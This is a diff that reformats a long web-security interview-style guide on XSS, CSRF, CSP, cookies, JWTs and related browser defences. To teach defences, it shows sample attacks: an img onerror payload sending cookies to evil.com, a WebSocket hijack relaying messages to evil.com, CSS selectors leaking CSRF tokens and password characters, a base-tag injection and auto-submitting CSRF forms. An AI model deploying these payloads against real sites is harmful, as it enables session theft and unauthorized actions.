@@ -484,12 +484,12 @@ Without this rule, any site you visit could read your email or bank account in o
 
 An origin is the combination of scheme (protocol), host and port. Two URLs have the same origin only if all three match.
 
-| URL                              | Same origin as `https://shop.com`? | Why             |
-| -------------------------------- | ---------------------------------- | --------------- |
-| `https://shop.com/cart`          | Yes                                | Only path is different |
-| `http://shop.com`                | No                                 | Different scheme |
-| `https://api.shop.com`           | No                                 | Different host   |
-| `https://shop.com:8443`          | No                                 | Different port   |
+| URL                     | Same origin as `https://shop.com`? | Why                    |
+| ----------------------- | ---------------------------------- | ---------------------- |
+| `https://shop.com/cart` | Yes                                | Only path is different |
+| `http://shop.com`       | No                                 | Different scheme       |
+| `https://api.shop.com`  | No                                 | Different host         |
+| `https://shop.com:8443` | No                                 | Different port         |
 
 ```js
 console.log(window.location.origin); // "https://shop.com"
@@ -523,7 +523,7 @@ Stored (or persistent) XSS happens when malicious input is saved and later shown
 
 ```html
 <!-- Comment text saved by an attacker -->
-<img src="x" onerror="fetch('https://evil.com/?c=' + document.cookie)">
+<img src="x" onerror="fetch('https://evil.com/?c=' + document.cookie)" />
 ```
 
 If the page renders comments with `innerHTML`, every user who opens that page runs the attacker's code. It is usually the most dangerous type because it hits many users and doesn't need them to click a special link.
@@ -574,7 +574,7 @@ That's why XSS is treated as a critical issue, even when the demo is only `alert
 ```js
 const input = '<img src=x onerror="alert(1)">';
 
-el.innerHTML = input;   // creates an <img>, the onerror handler runs
+el.innerHTML = input; // creates an <img>, the onerror handler runs
 el.textContent = input; // shows the text, nothing runs
 ```
 
@@ -585,7 +585,7 @@ When you just want to show text, always use `textContent` (or `innerText`). Use 
 It's true that `<script>` tags inserted with `innerHTML` don't run. But there are many other ways to run code from HTML, for example:
 
 ```html
-<img src=x onerror="alert(1)">
+<img src="x" onerror="alert(1)" />
 <svg onload="alert(1)"></svg>
 <a href="javascript:alert(1)">click</a>
 <iframe src="javascript:alert(1)"></iframe>
@@ -612,7 +612,10 @@ function escapeHtml(value) {
 }
 
 list.innerHTML = items
-  .map((item) => `<li title="${escapeHtml(item.title)}">${escapeHtml(item.name)}</li>`)
+  .map(
+    (item) =>
+      `<li title="${escapeHtml(item.title)}">${escapeHtml(item.name)}</li>`,
+  )
   .join("");
 ```
 
@@ -633,7 +636,7 @@ Because the attacker controls the client. They can:
 - Send requests directly to your API with any tool.
 
 ```html
-<input name="quantity" type="number" min="1" max="10">
+<input name="quantity" type="number" min="1" max="10" />
 ```
 
 This stops a normal user from typing `-5`, but nothing stops someone from sending `{"quantity": -5}` to the API. The server has to repeat the same checks.
@@ -658,7 +661,7 @@ DOMPurify is a popular, well-tested library that sanitizes HTML in the browser. 
 ```js
 import DOMPurify from "dompurify";
 
-const dirty = '<p>Hello <img src=x onerror=alert(1)></p>';
+const dirty = "<p>Hello <img src=x onerror=alert(1)></p>";
 const clean = DOMPurify.sanitize(dirty);
 // '<p>Hello <img src="x"></p>'
 
@@ -679,10 +682,12 @@ Say `bank.com` has an endpoint that transfers money with a form POST and uses a 
 
 ```html
 <form action="https://bank.com/transfer" method="POST" id="f">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="1000">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="1000" />
 </form>
-<script>document.getElementById("f").submit();</script>
+<script>
+  document.getElementById("f").submit();
+</script>
 ```
 
 When a logged-in user visits the attacker's page, the form submits to `bank.com`, and (if the cookie isn't protected by `SameSite`) the session cookie goes with it. The bank sees a valid session and makes the transfer.
@@ -693,7 +698,7 @@ A CSRF token is a random, unpredictable value the server gives to your page and 
 
 ```html
 <form method="POST" action="/transfer">
-  <input type="hidden" name="csrf_token" value="b9f3c1...random...">
+  <input type="hidden" name="csrf_token" value="b9f3c1...random..." />
   ...
 </form>
 ```
@@ -883,7 +888,7 @@ Content-Security-Policy: default-src 'self'; img-src 'self' https://images.examp
 You can also use a `<meta>` tag if you can't control headers (for example on some static hosting):
 
 ```html
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
 ```
 
 The meta version has limits: it doesn't support `frame-ancestors`, `report-uri`/`report-to` or `sandbox`, and it only applies to content after the tag. Headers are better when you can use them.
@@ -950,7 +955,8 @@ SRI lets you tell the browser the expected hash of a script or stylesheet. If th
 <script
   src="https://cdn.example.com/lib@4.2.1/lib.min.js"
   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
-  crossorigin="anonymous"></script>
+  crossorigin="anonymous"
+></script>
 ```
 
 This protects you if the CDN is hacked or the file is changed. It only works for files with fixed content, so you have to pin an exact version.
@@ -1018,7 +1024,9 @@ The user's original tab quietly changes to a phishing page. When they go back to
 - `noreferrer` does the same and also stops the browser from sending the `Referer` header.
 
 ```html
-<a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>
+<a href="https://external.com" target="_blank" rel="noopener noreferrer"
+  >Link</a
+>
 ```
 
 Modern browsers now treat `target="_blank"` as `noopener` by default, but adding it explicitly doesn't hurt. For `window.open()`, pass `"noopener"` in the features string, or set `newWindow.opener = null`.
@@ -1062,12 +1070,12 @@ That's why many teams prefer an HttpOnly cookie for the session, or keeping a sh
 
 ### 61: What is the difference between localStorage, sessionStorage and cookies from a security point of view?
 
-| | `localStorage` | `sessionStorage` | Cookie (HttpOnly) |
-| --- | --- | --- | --- |
-| Readable by JS | Yes | Yes | No |
-| Sent automatically with requests | No | No | Yes |
-| Lifetime | Until cleared | Until tab closes | Until expiry |
-| Main risk | Stolen by XSS | Stolen by XSS | CSRF (if not SameSite) |
+|                                  | `localStorage` | `sessionStorage` | Cookie (HttpOnly)      |
+| -------------------------------- | -------------- | ---------------- | ---------------------- |
+| Readable by JS                   | Yes            | Yes              | No                     |
+| Sent automatically with requests | No             | No               | Yes                    |
+| Lifetime                         | Until cleared  | Until tab closes | Until expiry           |
+| Main risk                        | Stolen by XSS  | Stolen by XSS    | CSRF (if not SameSite) |
 
 Web storage is scoped to the origin. Cookies are scoped by domain and path. None of these is "encrypted storage" on the user's device; anyone with access to the computer or a malicious extension can read them.
 
@@ -1086,7 +1094,9 @@ The server signs it, so it can later check that nobody changed it. JWTs are ofte
 No. A normal JWT (JWS) is signed, not encrypted. Anyone who has the token can decode the payload with a base64 decoder:
 
 ```js
-const payload = JSON.parse(atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
+const payload = JSON.parse(
+  atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")),
+);
 ```
 
 So don't put passwords, personal data you wouldn't show the user, or internal secrets in a JWT. The signature only proves that the token wasn't changed. There is an encrypted format (JWE), but it's much less common.
@@ -1209,14 +1219,14 @@ They help password managers fill the right fields, which encourages strong uniqu
 
 ```html
 <!-- Login -->
-<input type="email" name="email" autocomplete="username">
-<input type="password" name="password" autocomplete="current-password">
+<input type="email" name="email" autocomplete="username" />
+<input type="password" name="password" autocomplete="current-password" />
 
 <!-- Signup or change password -->
-<input type="password" name="new-password" autocomplete="new-password">
+<input type="password" name="new-password" autocomplete="new-password" />
 
 <!-- SMS or authenticator code -->
-<input inputmode="numeric" autocomplete="one-time-code">
+<input inputmode="numeric" autocomplete="one-time-code" />
 ```
 
 `new-password` also tells the password manager to suggest a generated password.
@@ -1334,7 +1344,10 @@ So for same-origin content, use one or the other, not both. If you need scripts 
 
 ```js
 // Parent page sends a message to the iframe
-iframe.contentWindow.postMessage({ type: "theme", value: "dark" }, "https://widget.example.com");
+iframe.contentWindow.postMessage(
+  { type: "theme", value: "dark" },
+  "https://widget.example.com",
+);
 
 // Inside the iframe
 window.addEventListener("message", (event) => {
@@ -1497,7 +1510,7 @@ window.addEventListener("pageshow", (event) => {
 No. `accept="image/*"` just filters the file picker so it's easier for the user. The user can choose "All files", and an attacker can send any file to the upload endpoint directly.
 
 ```html
-<input type="file" accept="image/png, image/jpeg">
+<input type="file" accept="image/png, image/jpeg" />
 ```
 
 The server has to check file type (by content, not just the extension or `Content-Type` the browser sends), size, and how the file is stored and served.
@@ -1708,7 +1721,7 @@ GET requests are meant to be safe and only read data. Browsers, proxies and tool
 
 ```html
 <!-- If delete works with GET, any site can do this -->
-<img src="https://app.com/account/delete">
+<img src="https://app.com/account/delete" />
 ```
 
 Also, `SameSite=Lax` cookies are still sent on cross-site top-level GET navigations, so a GET that changes state isn't protected by Lax. Use POST, PUT, PATCH or DELETE for anything that changes data.
@@ -1844,7 +1857,9 @@ The part of the URL after `#` is never sent to the server, so server-side filter
 
 ```js
 // Vulnerable
-document.querySelector("#tab-title").innerHTML = decodeURIComponent(location.hash.slice(1));
+document.querySelector("#tab-title").innerHTML = decodeURIComponent(
+  location.hash.slice(1),
+);
 
 // https://app.com/#<img src=x onerror=alert(1)>
 ```
@@ -1944,7 +1959,7 @@ Hidden fields (`<input type="hidden">`) are not shown on the page but are sent w
 
 ```html
 <!-- Don't trust this on the server -->
-<input type="hidden" name="price" value="99.00">
+<input type="hidden" name="price" value="99.00" />
 ```
 
 They're fine for things like CSRF tokens or IDs that the server will check anyway. Never trust a price, role or permission from a hidden field.
@@ -1954,7 +1969,11 @@ They're fine for things like CSRF tokens or IDs that the server will check anywa
 Even though modern browsers apply `noopener` by default for `target="_blank"`, user-provided links still carry risk: the URL may point to a phishing site, a `javascript:` URL, or an open redirect on your domain. Also, without `noreferrer`, the target learns which page the user came from.
 
 ```html
-<a href="{validated https URL}" target="_blank" rel="noopener noreferrer nofollow ugc">
+<a
+  href="{validated https URL}"
+  target="_blank"
+  rel="noopener noreferrer nofollow ugc"
+></a>
 ```
 
 Validate the scheme, consider showing the real domain to the user, and add `nofollow`/`ugc` so search engines don't treat spam links as endorsed by you.
@@ -2121,7 +2140,7 @@ Content parsed into a `<template>` is inert: scripts don't run, images don't loa
 
 ```js
 const tpl = document.createElement("template");
-tpl.innerHTML = untrusted;        // inert here
+tpl.innerHTML = untrusted; // inert here
 document.body.append(tpl.content.cloneNode(true)); // now handlers can run
 ```
 
@@ -2132,14 +2151,24 @@ So templates are fine for your own markup, where you then fill values with `text
 A tagged template literal can escape every value automatically:
 
 ```js
-const escapeMap = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
+const escapeMap = {
+  "&": "&amp;",
+  "<": "&lt;",
+  ">": "&gt;",
+  '"': "&quot;",
+  "'": "&#39;",
+};
 const escape = (v) => String(v).replace(/[&<>"']/g, (c) => escapeMap[c]);
 
 function html(strings, ...values) {
-  return strings.reduce((out, str, i) => out + str + (i < values.length ? escape(values[i]) : ""), "");
+  return strings.reduce(
+    (out, str, i) => out + str + (i < values.length ? escape(values[i]) : ""),
+    "",
+  );
 }
 
-card.innerHTML = html`<h2 class="title">${post.title}</h2><p>${post.body}</p>`;
+card.innerHTML = html`<h2 class="title">${post.title}</h2>
+  <p>${post.body}</p>`;
 ```
 
 The static parts are written by you, and every `${}` value is escaped. This covers text and quoted attributes. It still doesn't make values safe in `href`, `src`, `style` or event handler attributes, so validate URLs separately.
@@ -2173,7 +2202,10 @@ import { randomBytes } from "node:crypto";
 
 app.get("/", (req, res) => {
   const nonce = randomBytes(16).toString("base64");
-  res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`);
+  res.setHeader(
+    "Content-Security-Policy",
+    `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`,
+  );
   res.send(`<!doctype html><script nonce="${nonce}" src="/app.js"></script>`);
 });
 ```
@@ -2363,7 +2395,7 @@ The server creates a random CSRF token, stores it in the user's session, and put
 
 ```html
 <form method="POST" action="/settings">
-  <input type="hidden" name="_csrf" value="kq3...">
+  <input type="hidden" name="_csrf" value="kq3..." />
 </form>
 ```
 
@@ -2386,7 +2418,10 @@ The server sets a random token in a cookie (readable by JavaScript), and the fro
 
 ```js
 function getCookie(name) {
-  return document.cookie.split("; ").find((c) => c.startsWith(name + "="))?.split("=")[1];
+  return document.cookie
+    .split("; ")
+    .find((c) => c.startsWith(name + "="))
+    ?.split("=")[1];
 }
 
 await fetch("/api/transfer", {
@@ -2403,7 +2438,10 @@ An attacker's site can make the browser send the cookie but can't read it to put
 A plain HTML form or `<img>` can't add custom headers. A cross-origin `fetch` with a custom header triggers a CORS preflight, which fails unless your server allows that origin.
 
 ```js
-fetch("/api/delete", { method: "POST", headers: { "X-Requested-With": "fetch" } });
+fetch("/api/delete", {
+  method: "POST",
+  headers: { "X-Requested-With": "fetch" },
+});
 ```
 
 So if your API rejects state-changing requests without the header, cross-site attackers can't send a valid one. It's a decent extra layer for JSON APIs, but it depends on your CORS config being strict. It's usually combined with SameSite cookies or tokens rather than used alone.
@@ -2423,7 +2461,8 @@ The server can use them to reject cross-site requests to APIs:
 function isAllowed(req) {
   const site = req.headers["sec-fetch-site"];
   if (!site) return true; // old browser or non-browser client
-  if (site === "same-origin" || site === "same-site" || site === "none") return true;
+  if (site === "same-origin" || site === "same-site" || site === "none")
+    return true;
   // Allow simple cross-site navigations (links), block everything else
   return req.headers["sec-fetch-mode"] === "navigate" && req.method === "GET";
 }
@@ -2513,7 +2552,7 @@ This lets any website read authenticated responses from your API using the victi
 
 ```js
 const res = await fetch("https://other.com/data", { mode: "no-cors" });
-console.log(res.type);   // "opaque"
+console.log(res.type); // "opaque"
 console.log(res.status); // 0
 ```
 
@@ -2561,7 +2600,10 @@ This limits how long a stolen refresh token is useful and lets the server detect
 
 ```js
 const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
-const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
+const digest = await crypto.subtle.digest(
+  "SHA-256",
+  new TextEncoder().encode(verifier),
+);
 const challenge = base64url(new Uint8Array(digest));
 sessionStorage.setItem("pkce_verifier", verifier);
 ```
@@ -2582,7 +2624,8 @@ Current best practice (the OAuth 2.0 Security BCP and OAuth 2.1 draft) says to u
 const state = crypto.randomUUID();
 sessionStorage.setItem("oauth_state", state);
 // ...after redirect:
-if (params.get("state") !== sessionStorage.getItem("oauth_state")) throw new Error("Bad state");
+if (params.get("state") !== sessionStorage.getItem("oauth_state"))
+  throw new Error("Bad state");
 ```
 
 It stops CSRF on the redirect endpoint, where an attacker could otherwise feed their own authorization code to the victim's browser (similar to login CSRF). PKCE also protects against code injection, but `state` is still commonly used and is often required.
@@ -2593,7 +2636,9 @@ It can decode it and read the claims (for display, or to know when it expires), 
 
 ```js
 // OK for UI: show name, schedule a refresh before exp
-const { name, exp } = JSON.parse(atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
+const { name, exp } = JSON.parse(
+  atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")),
+);
 ```
 
 The API that receives the token must verify the signature, issuer, audience and expiry on every request.
@@ -2650,7 +2695,7 @@ Login works the same way with `navigator.credentials.get()` and `parseRequestOpt
 It lets the browser show saved passkeys in the autofill dropdown of the username field, next to saved passwords, so users don't need a separate "Sign in with passkey" button.
 
 ```html
-<input name="username" autocomplete="username webauthn">
+<input name="username" autocomplete="username webauthn" />
 ```
 
 ```js
@@ -2698,7 +2743,8 @@ For very sensitive buttons (OAuth consent, payment confirmation), some sites dis
   sandbox="allow-scripts"
   src="https://usercontent.example-cdn.com/render/123"
   referrerpolicy="no-referrer"
-  loading="lazy"></iframe>
+  loading="lazy"
+></iframe>
 ```
 
 - Leave out `allow-same-origin` so the content gets a unique opaque origin and can't read cookies or storage of any real origin.
@@ -2735,11 +2781,16 @@ Serving uploads from a separate registrable domain (for example `example-usercon
 const WIDGET_ORIGIN = "https://widget.example.com";
 
 window.addEventListener("message", (event) => {
-  if (event.origin !== WIDGET_ORIGIN || event.source !== widgetFrame.contentWindow) return;
+  if (
+    event.origin !== WIDGET_ORIGIN ||
+    event.source !== widgetFrame.contentWindow
+  )
+    return;
   const msg = event.data;
   switch (msg?.type) {
     case "resize":
-      if (Number.isFinite(msg.height)) widgetFrame.style.height = `${Math.min(msg.height, 2000)}px`;
+      if (Number.isFinite(msg.height))
+        widgetFrame.style.height = `${Math.min(msg.height, 2000)}px`;
       break;
   }
 });
@@ -2751,7 +2802,11 @@ window.addEventListener("message", (event) => {
 
 ```js
 const channel = new MessageChannel();
-iframe.contentWindow.postMessage({ type: "init" }, "https://widget.example.com", [channel.port2]);
+iframe.contentWindow.postMessage(
+  { type: "init" },
+  "https://widget.example.com",
+  [channel.port2],
+);
 
 channel.port1.onmessage = (e) => handleWidgetMessage(e.data);
 channel.port1.postMessage({ type: "theme", value: "dark" });
@@ -2767,16 +2822,16 @@ When one window opens another, they can keep references to each other. Even cros
 
 ### 211: What are the Referrer-Policy values and which ones should you use?
 
-| Value | What gets sent |
-| --- | --- |
-| `no-referrer` | Nothing |
-| `no-referrer-when-downgrade` | Full URL, except on HTTPS to HTTP |
-| `origin` | Only the origin, always |
-| `origin-when-cross-origin` | Full URL same-origin, origin cross-origin |
-| `same-origin` | Full URL same-origin, nothing cross-origin |
-| `strict-origin` | Origin, nothing on HTTPS to HTTP |
+| Value                             | What gets sent                                                                    |
+| --------------------------------- | --------------------------------------------------------------------------------- |
+| `no-referrer`                     | Nothing                                                                           |
+| `no-referrer-when-downgrade`      | Full URL, except on HTTPS to HTTP                                                 |
+| `origin`                          | Only the origin, always                                                           |
+| `origin-when-cross-origin`        | Full URL same-origin, origin cross-origin                                         |
+| `same-origin`                     | Full URL same-origin, nothing cross-origin                                        |
+| `strict-origin`                   | Origin, nothing on HTTPS to HTTP                                                  |
 | `strict-origin-when-cross-origin` | Full URL same-origin, origin cross-origin, nothing on downgrade (browser default) |
-| `unsafe-url` | Full URL, always |
+| `unsafe-url`                      | Full URL, always                                                                  |
 
 `strict-origin-when-cross-origin` is a good default. Use `no-referrer` or `same-origin` for pages with sensitive URLs. Avoid `unsafe-url`. You can also set it per element: `<a referrerpolicy="no-referrer">`.
 
@@ -2971,8 +3026,10 @@ Rule: templates come from your code, data comes from users. Never build template
 - `{{{value}}}` (triple braces) outputs the raw value as HTML, without escaping.
 
 ```handlebars
-<p>{{comment}}</p>    {{!-- safe --}}
-<p>{{{comment}}}</p>  {{!-- XSS if comment is user input --}}
+<p>{{comment}}</p>
+{{! safe }}
+<p>{{{comment}}}</p>
+{{! XSS if comment is user input }}
 ```
 
 Most template engines have a similar "raw" or "safe" mode. Searching the codebase for it is a quick way to find possible XSS. Also note that escaping isn't enough in URL attributes: `<a href="{{url}}">` is still vulnerable to `javascript:` URLs.
@@ -3023,7 +3080,8 @@ When you create script elements in JavaScript, you can set the integrity yoursel
 ```js
 const script = document.createElement("script");
 script.src = "https://cdn.example.com/lib@4.2.1/lib.min.js";
-script.integrity = "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC";
+script.integrity =
+  "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC";
 script.crossOrigin = "anonymous";
 document.head.append(script);
 ```
@@ -3032,10 +3090,10 @@ ES module imports can also be checked with an import map that has an `integrity`
 
 ```html
 <script type="importmap">
-{
-  "imports": { "lib": "https://cdn.example.com/lib@4.2.1/index.js" },
-  "integrity": { "https://cdn.example.com/lib@4.2.1/index.js": "sha384-..." }
-}
+  {
+    "imports": { "lib": "https://cdn.example.com/lib@4.2.1/index.js" },
+    "integrity": { "https://cdn.example.com/lib@4.2.1/index.js": "sha384-..." }
+  }
 </script>
 ```
 
@@ -3261,7 +3319,8 @@ It's CSRF for WebSockets. If the server authenticates the WebSocket handshake on
 ```js
 // On evil.com
 const ws = new WebSocket("wss://app.example.com/socket");
-ws.onmessage = (e) => fetch("https://evil.com/log", { method: "POST", body: e.data });
+ws.onmessage = (e) =>
+  fetch("https://evil.com/log", { method: "POST", body: e.data });
 ```
 
 The browser sends the user's cookies, and unlike normal CSRF, the attacker can read the messages coming back. The fix: check `Origin` against an allowlist during the handshake, use `SameSite` cookies, or use a token that the attacker can't get.
@@ -3294,7 +3353,10 @@ Permissions-Policy: camera=(self "https://meet.example.com"), microphone=(self "
 ```
 
 ```html
-<iframe src="https://meet.example.com/room/42" allow="camera; microphone"></iframe>
+<iframe
+  src="https://meet.example.com/room/42"
+  allow="camera; microphone"
+></iframe>
 ```
 
 A feature has to be allowed by both the header and the `allow` attribute for the iframe to use it. Third-party iframes get nothing powerful by default. Grant only what each embed needs.
@@ -3412,7 +3474,13 @@ import nounsanitized from "eslint-plugin-no-unsanitized";
 
 export default [
   nounsanitized.configs.recommended,
-  { rules: { "no-eval": "error", "no-implied-eval": "error", "no-new-func": "error" } },
+  {
+    rules: {
+      "no-eval": "error",
+      "no-implied-eval": "error",
+      "no-new-func": "error",
+    },
+  },
 ];
 ```
 
@@ -3443,9 +3511,9 @@ Many older sites still use jQuery. Watch for:
 - `$.globalEval()` and old `$.ajax` with `dataType: "script"` or JSONP.
 
 ```js
-$("#name").text(userName);          // safe
-$("#name").html(userName);          // XSS if untrusted
-$(location.hash);                    // old classic DOM XSS
+$("#name").text(userName); // safe
+$("#name").html(userName); // XSS if untrusted
+$(location.hash); // old classic DOM XSS
 ```
 
 Also, old jQuery versions (before 3.5) had XSS issues in `.html()` related to `htmlPrefilter`, so upgrading matters.
@@ -3552,9 +3620,15 @@ There are a few good uses: one-time fields like a CAPTCHA answer, or fields wher
 They give quick, built-in checks and the right mobile keyboard:
 
 ```html
-<input type="email" required maxlength="254">
-<input type="text" name="zip" pattern="\d{5}" inputmode="numeric" title="5 digits">
-<input type="number" min="1" max="10" step="1">
+<input type="email" required maxlength="254" />
+<input
+  type="text"
+  name="zip"
+  pattern="\d{5}"
+  inputmode="numeric"
+  title="5 digits"
+/>
+<input type="number" min="1" max="10" step="1" />
 ```
 
 The browser blocks form submission until they pass, and you can check them in JavaScript with `form.checkValidity()` or `input.validity`. They're for user experience only; the server repeats all of these checks. Also, `maxlength` doesn't stop pasted or scripted values from being longer on the server side.
@@ -3584,7 +3658,10 @@ https://bank.com/error?msg=Your account is locked. Call +1-555-0100 to unlock it
 The page shows the message in your own design and domain, which makes the scam believable. Avoid taking display messages from URL parameters. Use message codes that map to fixed texts on your side:
 
 ```js
-const messages = { locked: "Your account is locked.", expired: "Your session expired." };
+const messages = {
+  locked: "Your account is locked.",
+  expired: "Your session expired.",
+};
 banner.textContent = messages[params.get("msg")] ?? "";
 ```
 
@@ -3628,8 +3705,12 @@ But setting styles from JavaScript through the CSSOM (`el.style.color = "red"`, 
 If an attacker can inject CSS, they can use attribute selectors to leak data, for example from a hidden input's `value`:
 
 ```css
-input[name="csrf"][value^="a"] { background: url(https://evil.com/?c=a); }
-input[name="csrf"][value^="b"] { background: url(https://evil.com/?c=b); }
+input[name="csrf"][value^="a"] {
+  background: url(https://evil.com/?c=a);
+}
+input[name="csrf"][value^="b"] {
+  background: url(https://evil.com/?c=b);
+}
 ```
 
 Defenses:
@@ -3807,7 +3888,12 @@ Mass assignment is when the server takes the whole request body and saves it int
 // The UI sends { name, email }, but an attacker adds:
 fetch("/api/profile", {
   method: "PATCH",
-  body: JSON.stringify({ name: "Eve", email: "eve@x.com", role: "admin", verified: true }),
+  body: JSON.stringify({
+    name: "Eve",
+    email: "eve@x.com",
+    role: "admin",
+    verified: true,
+  }),
 });
 ```
 
@@ -3939,7 +4025,7 @@ With `'strict-dynamic'`, gadgets that create script elements are especially dang
 If `base-uri` isn't restricted, an attacker who can inject HTML before your scripts can add:
 
 ```html
-<base href="https://evil.com/">
+<base href="https://evil.com/" />
 ```
 
 Your own trusted script, `<script nonce="abc" src="/js/app.js">`, now resolves to `https://evil.com/js/app.js`. It still has a valid nonce, so CSP allows it, and the attacker's file runs. `base-uri 'none'` (or `'self'`) prevents this, which is why it's part of every strict CSP.
@@ -4072,7 +4158,12 @@ function resourceIsolation(req, res, next) {
   if (!site) return next(); // browser didn't send it
   if (["same-origin", "same-site", "none"].includes(site)) return next();
   // Allow normal cross-site navigation to pages
-  if (mode === "navigate" && req.method === "GET" && !["object", "embed"].includes(dest)) return next();
+  if (
+    mode === "navigate" &&
+    req.method === "GET" &&
+    !["object", "embed"].includes(dest)
+  )
+    return next();
   // Endpoints meant to be public cross-site can be listed explicitly
   return res.status(403).send("Cross-site request blocked");
 }
@@ -4203,7 +4294,9 @@ FedCM (Federated Credential Management) is a browser API for "Sign in with X" fl
 ```js
 const credential = await navigator.credentials.get({
   identity: {
-    providers: [{ configURL: "https://idp.example/fedcm.json", clientId: "my-app" }],
+    providers: [
+      { configURL: "https://idp.example/fedcm.json", clientId: "my-app" },
+    ],
   },
 });
 // send credential.token to your server
@@ -4262,8 +4355,12 @@ So the security of your main app depends on the weakest subdomain. Keep untruste
 - An HTML form can send `enctype="text/plain"` with a body that happens to be valid JSON:
 
 ```html
-<form action="https://api.example.com/transfer" method="POST" enctype="text/plain">
-  <input name='{"to":"eve","amount":1000,"x":"' value='"}'>
+<form
+  action="https://api.example.com/transfer"
+  method="POST"
+  enctype="text/plain"
+>
+  <input name='{"to":"eve","amount":1000,"x":"' value='"}' />
 </form>
 <!-- Body: {"to":"eve","amount":1000,"x":"="} -->
 ```
@@ -4430,8 +4527,12 @@ Solutions:
 ```js
 let refreshing = null;
 function refreshOnce() {
-  refreshing ??= fetch("/auth/refresh", { method: "POST", credentials: "include" })
-    .finally(() => { refreshing = null; });
+  refreshing ??= fetch("/auth/refresh", {
+    method: "POST",
+    credentials: "include",
+  }).finally(() => {
+    refreshing = null;
+  });
   return refreshing;
 }
 ```
@@ -4610,7 +4711,9 @@ XSSI is when an attacker's page includes your endpoint with a `<script>` tag to 
 ```html
 <!-- On evil.com: your server returns user-specific JS -->
 <script src="https://app.example.com/config.js"></script>
-<script>sendToAttacker(window.APP_CONFIG.email);</script>
+<script>
+  sendToAttacker(window.APP_CONFIG.email);
+</script>
 ```
 
 Defenses: don't put user-specific data in JavaScript files; serve data as JSON with the right `Content-Type` and `nosniff` (ORB then blocks it as a script); use SameSite cookies; and use Fetch Metadata to reject `Sec-Fetch-Dest: script` requests for data endpoints from other sites.
@@ -4620,8 +4723,12 @@ Defenses: don't put user-specific data in JavaScript files; serve data as JSON w
 With CSS injection, an attacker can create rules like:
 
 ```css
-input[type="password"][value$="a"] { background-image: url("https://evil.com/k?a"); }
-input[type="password"][value$="b"] { background-image: url("https://evil.com/k?b"); }
+input[type="password"][value$="a"] {
+  background-image: url("https://evil.com/k?a");
+}
+input[type="password"][value$="b"] {
+  background-image: url("https://evil.com/k?b");
+}
 ```
 
 This only works when the `value` attribute changes as the user types, which happens in some frameworks or code that syncs the property back to the attribute. Plain HTML inputs don't update the attribute, so the trick doesn't work on them. The lesson: don't mirror sensitive input values into DOM attributes, and block CSS injection with escaping and `style-src`.
@@ -4793,17 +4900,29 @@ Browsers now hide local IPs behind random mDNS hostnames (`xxxx.local`) unless t
 Use AES-GCM with a random IV for each message:
 
 ```js
-const key = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
+const key = await crypto.subtle.generateKey(
+  { name: "AES-GCM", length: 256 },
+  false,
+  ["encrypt", "decrypt"],
+);
 
 async function encrypt(text) {
   const iv = crypto.getRandomValues(new Uint8Array(12));
   const data = new TextEncoder().encode(text);
-  const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, data);
+  const ciphertext = await crypto.subtle.encrypt(
+    { name: "AES-GCM", iv },
+    key,
+    data,
+  );
   return { iv, ciphertext };
 }
 
 async function decrypt({ iv, ciphertext }) {
-  const data = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ciphertext);
+  const data = await crypto.subtle.decrypt(
+    { name: "AES-GCM", iv },
+    key,
+    ciphertext,
+  );
   return new TextDecoder().decode(data);
 }
 ```
@@ -4869,8 +4988,13 @@ Valid uses for `crypto.subtle.digest`:
 
 ```js
 async function sha256Hex(text) {
-  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
-  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
+  const buf = await crypto.subtle.digest(
+    "SHA-256",
+    new TextEncoder().encode(text),
+  );
+  return [...new Uint8Array(buf)]
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
 }
 ```
 
@@ -4907,10 +5031,17 @@ If you store HTML, every place that renders it (web, mobile, email, admin tools)
 If you store a structured format, like:
 
 ```json
-{ "type": "paragraph", "children": [
-  { "type": "text", "text": "Hello " },
-  { "type": "link", "href": "https://example.com", "children": [{ "type": "text", "text": "site" }] }
-]}
+{
+  "type": "paragraph",
+  "children": [
+    { "type": "text", "text": "Hello " },
+    {
+      "type": "link",
+      "href": "https://example.com",
+      "children": [{ "type": "text", "text": "site" }]
+    }
+  ]
+}
 ```
 
 the renderer builds elements from known node types with `createElement` and `textContent`, and validates attributes like `href`. Unknown types are ignored. There's no HTML parsing of user data at all, so there's nothing to bypass. Most modern editors (ProseMirror, Lexical, Slate) work this way internally.
@@ -5054,7 +5185,9 @@ Test with `curl -I` after deploy; it's easy to configure headers that apply only
 Many server-rendered apps put data into the page like:
 
 ```html
-<script>window.__DATA__ = <%- JSON.stringify(data) %></script>
+<script>
+  window.__DATA__ = <%- JSON.stringify(data) %>
+</script>
 ```
 
 `JSON.stringify` doesn't escape `<`, so a value containing `</script><script>alert(1)</script>` ends the script tag and injects HTML. Fixes:
@@ -5121,7 +5254,9 @@ async function fetchWithRetry(url, options, attempts = 3) {
     const res = await fetch(url, options);
     if (res.status !== 429 && res.status < 500) return res;
     const retryAfter = Number(res.headers.get("Retry-After"));
